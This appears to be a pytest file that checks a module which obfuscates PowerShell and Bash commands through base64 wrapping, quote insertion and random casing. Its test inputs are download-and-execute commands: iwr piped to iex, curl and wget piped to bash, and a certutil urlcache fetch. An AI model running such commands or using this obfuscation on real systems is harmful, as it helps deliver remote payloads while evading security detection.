"""Tests for obfuscate_.py: PowerShell and Bash obfuscation output validity."""

import base64
import re

import pytest

from exchanger.obfuscate_ import (
    obfuscate_bash,
    obfuscate_powershell,
    _bash_base64_wrap,
    _bash_quote_tricks,
    _random_case,
)


def test_obfuscate_powershell_returns_non_empty():
    cmd = 'iwr -Uri "http://192.168.1.1/x" -UseBasicParsing | iex'
    out = obfuscate_powershell(cmd)
    assert len(out) >= len(cmd) or "iwr" in out or "Iwr" in out or "i''wr" in out


def test_obfuscate_powershell_contains_uri_or_obfuscated_cmdlet():
    cmd = 'iwr -Uri "http://h/p" -OutFile "out"'
    out = obfuscate_powershell(cmd)
    assert "http" in out
    assert "out" in out or "Out" in out


def test_obfuscate_powershell_true_false_substitute():
    cmd = "something $True and $False"
    out = obfuscate_powershell(cmd)
    assert "[bool]1" in out
    assert "[bool]0" in out


def test_obfuscate_bash_returns_non_empty():
    cmd = "curl -s http://192.168.1.1/x | bash"
    out = obfuscate_bash(cmd)
    assert len(out) > 0


def test_obfuscate_bash_base64_wrap_decodes_to_original():
    cmd = "curl -s http://example.com/script | bash"
    wrapped = _bash_base64_wrap(cmd)
    assert "base64 -d" in wrapped
    assert "bash" in wrapped
    match = re.search(r"echo\s+(\S+)\s+\|", wrapped)
    assert match
    b64 = match.group(1)
    decoded = base64.b64decode(b64).decode()
    assert decoded == cmd


def test_obfuscate_bash_quote_tricks_preserves_length_plus_quotes():
    s = "curl"
    out = _bash_quote_tricks(s)
    assert "''" in out
    assert "curl" in out or out.replace("''", "") == "curl"


def test_random_case_returns_same_length():
    s = "Invoke-WebRequest"
    out = _random_case(s)
    assert len(out) == len(s)
    assert out.lower() == s.lower()


def test_obfuscate_bash_multiple_calls_produce_runnable_variants():
    cmd = "wget -qO- http://x/y | bash"
    results = [obfuscate_bash(cmd) for _ in range(8)]
    for out in results:
        assert "wget" in out or "base64" in out or "''" in out
        assert "http" in out or "echo " in out


def test_obfuscate_powershell_iex_obfuscated():
    cmd = "iex (Get-Content x)"
    out = obfuscate_powershell(cmd)
    # iex is obfuscated (quote interruption or random case)
    assert "iex" in out.lower() or "i''ex" in out or "i\"\"ex" in out


def test_obfuscate_powershell_certutil_bitsadmin_case():
    cmd = "certutil -urlcache -split -f http://h/x out"
    out = obfuscate_powershell(cmd)
    assert "certutil" in out.lower()
    assert "http" in out
